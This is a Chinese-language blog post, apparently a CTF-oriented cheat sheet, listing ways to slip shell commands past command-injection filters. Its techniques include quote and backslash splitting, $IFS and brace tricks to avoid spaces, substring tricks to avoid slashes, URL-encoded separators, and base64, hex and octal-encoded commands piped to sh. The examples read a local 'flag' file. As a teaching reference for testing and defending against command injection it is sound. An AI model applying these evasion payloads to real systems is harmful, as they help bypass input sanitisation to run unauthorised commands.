<!DOCTYPE html><html lang=zh-CN><head><meta charset=utf-8><meta name=X-UA-Compatible content="IE=edge"><title>代码执行绕过 | 初级 | 小结 | Blog | btwoa</title><meta name=description content="代码执行绕过 | 初级 | 小结 | btwoa"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=https://ovo.btwoa.com/favicon/hexo/favicon.png><link rel=stylesheet href=/css/apollo.css><link rel=search type=application/opensearchdescription+xml href=https://blog.btwoa.com/atom.xml title="Blog | btwoa"><script integrity=sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq src=//instant.page/5.1.1 type=module></script><!-- hexo injector head_end start --><link rel=manifest href=/manifest.json><!-- hexo injector head_end end --><meta name=generator content="Hexo 6.2.0"><link rel=alternate href=/atom.xml title="Blog | btwoa" type=application/atom+xml><link rel=alternate href=/rss.xml title="Blog | btwoa" type=application/rss+xml></head><body><div class=container data-bs-spy=scroll data-bs-target=#toc-nav data-bs-offset=0></div><div class=wrap><header><a class=logo-link href=/ ><img src=https://ovo.btwoa.com/blog.webp alt=logo></a><ul class="nav nav-list"><li class=nav-list-item><a class=nav-list-link href=https://btwoa.com target=_blank>主页</a></li><li class=nav-list-item><a class=nav-list-link href=/talk/ target=_self>说说</a></li><li class=nav-list-item><a class=nav-list-link href=/circle/ target=_self>小圈</a></li><li class=nav-list-item><a class=nav-list-link href=/link/ target=_self>友链</a></li><li class=nav-list-item><a class=nav-list-link href=/archives/ target=_self>归档</a></li><li class=nav-list-item><a class=nav-list-link href=https://monitor.btwoa.com target=_blank>监测</a></li></ul></header><main class=container><article class=post-block><h1 class=post-title>代码执行绕过 | 初级 | 小结</h1><div class=post-info>2020年9月24日<div class=post-tags><a class=post-tag-link href=/tags/Bypass/ rel=tag># 绕过</a> <a class=post-tag-link href=/tags/Encode/ rel=tag># 编码</a></div></div><div class=post-toc><h3 class=post-toc-title>代码执行绕过 | 初级 | 小结</h3><nav class=navbar id=toc-nav><ol class=nav><li class="nav-item nav-level-2"><a class=nav-link href=#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87><span class=nav-text>拼接绕过</span></a><ol class=nav-child><li class="nav-item nav-level-3"><a class=nav-link href=#%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87><span class=nav-text>反斜杠绕过</span></a></li><li class="nav-item nav-level-3"><a class=nav-link href=#%E5%8F%8D%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87><span class=nav-text>反单引号绕过</span></a></li><li class="nav-item nav-level-3"><a class=nav-link href=#%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87><span class=nav-text>单引号绕过</span></a></li><li class="nav-item nav-level-3"><a class=nav-link href=#%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87><span class=nav-text>双引号绕过</span></a></li><li class="nav-item nav-level-3"><a class=nav-link href=#%E6%8F%92%E5%85%A5%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87><span class=nav-text>插入注释绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87><span class=nav-text>自定义变量绕过</span></a></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E6%9C%AA%E5%88%9D%E5%A7%8B%E5%8C%96%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87><span class=nav-text>未初始化变量绕过</span></a></li><li class="nav-item nav-level-2"><a class=nav-link href=#Shell-%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87><span class=nav-text>Shell 特殊变量绕过</span></a><ol class=nav-child><li class="nav-item nav-level-3"><a class=nav-link href=#Shell-%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F><span class=nav-text>Shell 特殊变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E5%88%A9%E7%94%A8PATH%E7%BB%95%E8%BF%87><span class=nav-text>利用PATH绕过</span></a></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E8%BF%87%E6%BB%A4%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87><span class=nav-text>过滤斜杠绕过</span></a><ol class=nav-child><li class="nav-item nav-level-3"><a class=nav-link href=#HOME-0-1><span class=nav-text>${HOME:0:1}</span></a></li><li class="nav-item nav-level-3"><a class=nav-link href=#echo-tr-%E2%80%98-0%E2%80%99-%E2%80%98%E2%80%9C-1%E2%80%99><span class=nav-text>echo . | tr ‘!-0’ ‘“-1’</span></a></li></ol></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87><span class=nav-text>过滤空格绕过</span></a><ol class=nav-child><li class="nav-item nav-level-3"><a class=nav-link href=#Linux><span class=nav-text>Linux</span></a><ol class=nav-child><li class="nav-item nav-level-4"><a class=nav-link href=#OS-COMMAND-ARGUMENT-%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4><span class=nav-text>{OS_COMMAND,ARGUMENT}可执行系统命令</span></a></li><li class="nav-item nav-level-4"><a class=nav-link><span class=nav-text>;</span></a></li><li class="nav-item nav-level-4"><a class=nav-link href=#%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6><span class=nav-text>重定向符</span></a><ol class=nav-child><li class="nav-item nav-level-5"><a class=nav-link href=#lt-%E5%92%8C-lt-gt><span class=nav-text>&lt;和&lt;&gt;</span></a><ol class=nav-child><li class="nav-item nav-level-6"><a class=nav-link href=#%E7%A4%BA%E4%BE%8B><span class=nav-text>示例</span></a></li></ol></li><li class="nav-item nav-level-5"><a class=nav-link href=#IFS><span class=nav-text>IFS</span></a><ol class=nav-child><li class="nav-item nav-level-6"><a class=nav-link href=#IFS-1><span class=nav-text>$IFS</span></a></li><li class="nav-item nav-level-6"><a class=nav-link href=#IFS-9><span class=nav-text>$IFS$9</span></a></li><li class="nav-item nav-level-6"><a class=nav-link href=#IFS-2><span class=nav-text>${IFS}</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class=nav-link href=#Windows><span class=nav-text>Windows</span></a></li><li class="nav-item nav-level-3"><a class=nav-link href=#URL-%E7%BC%96%E7%A0%81><span class=nav-text>URL 编码</span></a><ol class=nav-child><li class="nav-item nav-level-4"><a class=nav-link href=#PHP-%E7%8E%AF%E5%A2%83><span class=nav-text>PHP 环境</span></a><ol class=nav-child><li class="nav-item nav-level-5"><a class=nav-link href=#%E5%91%BD%E4%BB%A4%E7%BB%88%E6%AD%A2%E7%AC%A6><span class=nav-text>命令终止符</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class=nav-link href=#%E7%A4%BA%E4%BE%8B-1><span class=nav-text>示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class=nav-link href=#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87><span class=nav-text>编码绕过</span></a><ol class=nav-child><li class="nav-item nav-level-3"><a class=nav-link href=#base64><span class=nav-text>base64</span></a></li><li class="nav-item nav-level-3"><a class=nav-link href=#hex><span class=nav-text>hex</span></a></li><li class="nav-item nav-level-3"><a class=nav-link href=#oct><span class=nav-text>oct</span></a></li></ol></li></ol></nav></div><div class=post-content><p>梳理总结相关知识，持续记录各种绕过方法。</p><span id=more></span><h2 id=拼接绕过><a href=#拼接绕过 class=headerlink title=拼接绕过></a>拼接绕过</h2><h3 id=反斜杠绕过><a href=#反斜杠绕过 class=headerlink title=反斜杠绕过></a>反斜杠绕过</h3><p>ca\t fl\ag</p><h3 id=反单引号绕过><a href=#反单引号绕过 class=headerlink title=反单引号绕过></a>反单引号绕过</h3><p>c``a``t flag</p><h3 id=单引号绕过><a href=#单引号绕过 class=headerlink title=单引号绕过></a>单引号绕过</h3><p>c’’a’’t flag</p><h3 id=双引号绕过><a href=#双引号绕过 class=headerlink title=双引号绕过></a>双引号绕过</h3><p>c””a””t flag</p><h3 id=插入注释绕过><a href=#插入注释绕过 class=headerlink title=插入注释绕过></a>插入注释绕过</h3><p>c\*ba2in9a*\at flag</p><h2 id=自定义变量绕过><a href=#自定义变量绕过 class=headerlink title=自定义变量绕过></a>自定义变量绕过</h2><p>a&#x3D;l;b&#x3D;s;$a$b</p><p>a&#x3D;fl;b&#x3D;ag;cat $a$b</p><h2 id=未初始化变量绕过><a href=#未初始化变量绕过 class=headerlink title=未初始化变量绕过></a>未初始化变量绕过</h2><p>cat$m flag</p><h2 id=Shell-特殊变量绕过><a href=#Shell-特殊变量绕过 class=headerlink title="Shell 特殊变量绕过"></a>Shell 特殊变量绕过</h2><p>当变量不存在时其值为空</p><h3 id=Shell-特殊变量><a href=#Shell-特殊变量 class=headerlink title="Shell 特殊变量"></a>Shell 特殊变量</h3><details><summary><b><samp>点击查看内容</samp></b></summary><ul><li>$0 : 当前脚本的文件名</li><li>$n : 传递给脚本或函数的参数（n为正整数）</li><li>$# : 传递给脚本或函数的参数个数</li><li>$* : 传递给脚本或函数的所有参数</li><li>$@ : 传递给脚本或函数的所有参数</li><li>$? : 上个命令的退出状态，或函数的返回值</li><li>$$ : 当前 Shell 进程或 Shell 脚本所在进程 ID</li><li>"$*" : 会将所有的参数作为一个整体，以"$1 $2 … \$n"的形式输出所有参数</li><li>"$@" : 会将各个参数分开，以"$1" "$2" … "$n" 的形式输出所有参数</li></ul></details><h2 id=利用PATH绕过><a href=#利用PATH绕过 class=headerlink title=利用PATH绕过></a>利用PATH绕过</h2><p>${PATH:5:1} -&gt; l</p><p>${PATH:2:1} -&gt; s</p><p>${PATH:5:1}${PATH:2:1}</p><h2 id=过滤斜杠绕过><a href=#过滤斜杠绕过 class=headerlink title=过滤斜杠绕过></a>过滤斜杠绕过</h2><h3 id=HOME-0-1><a href=#HOME-0-1 class=headerlink title=${HOME:0:1}></a>${HOME:0:1}</h3><p>cat ${HOME:0:1}flag</p><h3 id=echo-tr-‘-0’-‘“-1’><a href=#echo-tr-‘-0’-‘“-1’ class=headerlink title="echo . | tr ‘!-0’ ‘“-1’"></a>echo . | tr ‘!-0’ ‘“-1’</h3><p>cat $(echo . | tr ‘!-0’ ‘“-1’)flag</p><h2 id=过滤空格绕过><a href=#过滤空格绕过 class=headerlink title=过滤空格绕过></a>过滤空格绕过</h2><h3 id=Linux><a href=#Linux class=headerlink title=Linux></a>Linux</h3><h4 id=OS-COMMAND-ARGUMENT-可执行系统命令><a href=#OS-COMMAND-ARGUMENT-可执行系统命令 class=headerlink title={OS_COMMAND,ARGUMENT}可执行系统命令></a>{OS_COMMAND,ARGUMENT}可执行系统命令</h4><p>{cat,flag.php}</p><h4 id=""><a href=# class=headerlink title=;></a>;</h4><p>连接前后命令，多条命令顺序执行，命令之间没有任何逻辑关系</p><h4 id=重定向符><a href=#重定向符 class=headerlink title=重定向符></a>重定向符</h4><h5 id=lt-和-lt-gt><a href=#lt-和-lt-gt class=headerlink title=&lt;和&lt;&gt;></a>&lt;和&lt;&gt;</h5><p>cat&lt;flag.txt</p><p>cat&lt;&gt;flag.txt</p><h6 id=示例><a href=#示例 class=headerlink title=示例></a>示例</h6><details><summary><b><samp>点击查看内容</samp></b></summary><table><caption>输出重定向符号</caption><tbody><tr><th>类&nbsp;型</th><th>符&nbsp;号</th><th>作&nbsp;用</th></tr><tr><td rowspan=2>标准输出重定向</td><td>command&nbsp;&gt;file</td><td>以覆盖的方式，把 command 的正确输出结果输出到 file&nbsp;文件中</td></tr><tr><td>command &gt;&gt;file</td><td>以追加的方式，把 command 的正确输出结果输出到 file&nbsp;文件中</td></tr><tr><td rowspan=2>标准错误输出重定向</td><td>command 2&gt;file</td><td>以覆盖的方式，把 command 的错误信息输出到 file&nbsp;文件中</td></tr><tr><td>command 2&gt;&gt;file</td><td>以追加的方式，把 command&nbsp;的错误信息输出到 file&nbsp;文件中</td></tr><tr><td colspan=1 rowspan=6>正确输出和错误信息同时保存</td><td>command &gt;file&nbsp;2&gt;&amp;1</td><td>以覆盖的方式，把正确输出和错误信息同时保存到同一个文件（file）中</td></tr><tr><td>command &gt;&gt;file&nbsp;2&gt;&amp;1</td><td>以追加的方式，把正确输出和错误信息同时保存到同一个文件（file）中</td></tr><tr><td>command &gt;file1 2&gt;file2</td><td>以覆盖的方式，把正确的输出结果输出到 file1 文件中，把错误信息输出到 file2 文件中</td></tr><tr><td>command &gt;&gt;file1&nbsp; 2&gt;&gt;file2</td><td>以追加的方式，把正确的输出结果输出到 file1 文件中，把错误信息输出到 file2 文件中</td></tr><tr><td>command &gt;file 2&gt;file</td><td colspan=1 rowspan=2>【<span style=color:#b22222;><b>不推荐</b></span>】这两种写法会导致 file 被打开两次，引起资源竞争， stdout 和 stderr 会互相覆盖</td></tr><tr><td>command &gt;&gt;file 2&gt;&gt;file</td></tr></tbody></table></details><h5 id=IFS><a href=#IFS class=headerlink title=IFS></a>IFS</h5><h6 id=IFS-1><a href=#IFS-1 class=headerlink title=$IFS></a>$IFS</h6><p>$IFS 在 Linux 下表示分隔符</p><p>cat$IFSflag.txt</p><p>bash 会将 IFSflag 当作变量名，导致无法输出预期结果</p><h6 id=IFS-9><a href=#IFS-9 class=headerlink title=$IFS$9></a>$IFS$9</h6><p>加个 $ 起截断的作用</p><p>$9表示当前系统 shell 进程的第九个参数的持有者，其始终为空字符串</p><p>cat$IFS$9flag.txt</p><h6 id=IFS-2><a href=#IFS-2 class=headerlink title=${IFS}></a>${IFS}</h6><p>加 {} 起固定变量名的作用</p><p>cat${IFS}flag.txt</p><h3 id=Windows><a href=#Windows class=headerlink title=Windows></a>Windows</h3><p>仅 type 命令可行</p><p>type.\flag.txt</p><p>type,flag.txt</p><h3 id=URL-编码><a href=#URL-编码 class=headerlink title="URL 编码"></a>URL 编码</h3><h4 id=PHP-环境><a href=#PHP-环境 class=headerlink title="PHP 环境"></a>PHP 环境</h4><p>%09 horizontal tab 水平制表符</p><p>%0a line feed 换行符</p><p>%0d vertical tab 垂直制表符</p><h5 id=命令终止符><a href=#命令终止符 class=headerlink title=命令终止符></a>命令终止符</h5><p>%00 null character 零字符</p><p>%20# space 空格符</p><h3 id=示例-1><a href=#示例-1 class=headerlink title=示例></a>示例</h3><p>ca$9t fl$9ag</p><p>ca$*t fl$*ag</p><p>ca$@t fl$@ag</p><h2 id=编码绕过><a href=#编码绕过 class=headerlink title=编码绕过></a>编码绕过</h2><p>反引号``和$()和{}|$0用来表示命令执行</p><p>cat &#x2F;flag</p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br></pre></td><td class=code><pre><span class=line>base64:  Y2F0IC9mbGFn</span><br><span class=line></span><br><span class=line>hex:  636174202f666c6167</span><br><span class=line></span><br><span class=line>oct:  \x63\x61\x74\x20\x2f\x66\x6c\x61\x67</span><br></pre></td></tr></table></figure><h3 id=base64><a href=#base64 class=headerlink title=base64></a>base64</h3><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br></pre></td><td class=code><pre><span class=line>echo Y2F0IC9mbGFn|base64 -d|sh</span><br><span class=line></span><br><span class=line>`echo Y2F0IC9mbGFn|base64 -d`</span><br><span class=line></span><br><span class=line>$(echo Y2F0IC9mbGFn|base64 -d)</span><br><span class=line></span><br><span class=line>&#123;echo Y2F0IC9mbGFn|base64 -d&#125;|$0</span><br></pre></td></tr></table></figure><h3 id=hex><a href=#hex class=headerlink title=hex></a>hex</h3><p>echo 636174202f666c6167|xxd -r -p|sh</p><p>`echo 636174202f666c6167|xxd -r -p`</p><p>$(echo 636174202f666c6167|xxd -r -p)</p><p>{echo 636174202f666c6167|xxd -r -p}|$0</p><h3 id=oct><a href=#oct class=headerlink title=oct></a>oct</h3><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br></pre></td><td class=code><pre><span class=line>$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;)</span><br><span class=line></span><br><span class=line>&#123;printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|$0</span><br></pre></td></tr></table></figure><link rel=stylesheet href=/css/spoiler.css type=text/css><script src=/js/spoiler.js type=text/javascript async></script></div></article></main><footer><div class=paginator><a class=prev href=/cef4ee6d/ >PREV</a><a class=next href=/e5201314/ >NEXT</a></div><div id=tcomment></div><script src=/js/twikoo.all.min.js></script><script>twikoo.init({envId:"https://twikoo.btwoa.com/",el:"#tcomment",path:"window.location.pathname",lang:"zh-CN"})</script><div class=copyright><p>Copyright Ⓒ 2019-2022 <a href=https://beian.miit.gov.cn/ target=_blank>陇ICP备20001210号</a></p></div></footer></div><script>!function(e,a,t,g,n,o){e.GoogleAnalyticsObject=g,e.ga||(e.ga=function(){(e.ga.q=e.ga.q||[]).push(arguments)}),e.ga.l=+new Date,n=a.createElement(t),o=a.getElementsByTagName(t)[0],n.src="/js/google-analytics.js",o.parentNode.insertBefore(n,o)}(window,document,"script","ga"),ga("create","UA-235222810-1","auto"),ga("send","pageview")</script><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?01b308cf7144f10b91966ae6f284d4cb",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)}()</script><script>!function(t){"use strict";function s(){e.LA.ids.push(i)}var e=window,c=document,i=t,o="".concat("https:"===c.location.protocol?"https://":"http://","sdk.51.la/js-sdk-pro.min.js"),n=c.createElement("script"),c=c.getElementsByTagName("script")[0];n.type="text/javascript",n.setAttribute("charset","UTF-8"),n.async=!0,n.src=o,n.id="LA_COLLECT",i.d=n,e.LA?e.LA.ids&&s():(e.LA=t,e.LA.ids=[],s()),c.parentNode.insertBefore(n,c)}({id:"JoXIxCzhNG7DwlUJ",ck:"JoXIxCzhNG7DwlUJ"})</script><script>!function(e,n){var t=n.createElement("script"),n=n.getElementsByTagName("script")[0];t.type="text/javascript",t.crossorigin=!0,t.onload=function(){(new e.LingQue.Monitor).init({id:"JoewdpDnTBrOF23U",sendSuspicious:!0,sendSpaPv:!0})},n.parentNode.insertBefore(t,n),t.src="https://sdk.51.la/perf/js-sdk-perf.min.js"}(window,document)</script><script defer=defer src=/js/bootstrap.min.js type=text/javascript></script><script defer=defer src=/js/console.js type=text/javascript></script><!-- hexo injector body_end start --><script>"serviceWorker"in navigator&&window.addEventListener("load",()=>{navigator.serviceWorker.register("/sw.js")})</script><!-- hexo injector body_end end --></body></html>